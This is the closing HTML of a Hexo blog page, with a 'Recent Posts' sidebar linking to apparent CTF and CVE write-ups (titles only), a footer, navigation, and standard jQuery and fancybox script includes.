    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/04/09/MRCTF2020-web/">MRCTF2020-web</a>
          </li>
        
          <li>
            <a href="/2020/04/09/CVE-2020-1938/">CVE-2020-1938</a>
          </li>
        
          <li>
            <a href="/2020/04/09/CVE-2019-0232/">CVE-2019-0232</a>
          </li>
        
          <li>
            <a href="/2020/03/30/thinkphp5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">thinkphp5.1反序列化</a>
          </li>
        
          <li>
            <a href="/2020/03/20/BJDCTF-2nd/">BJDCTF-2nd</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>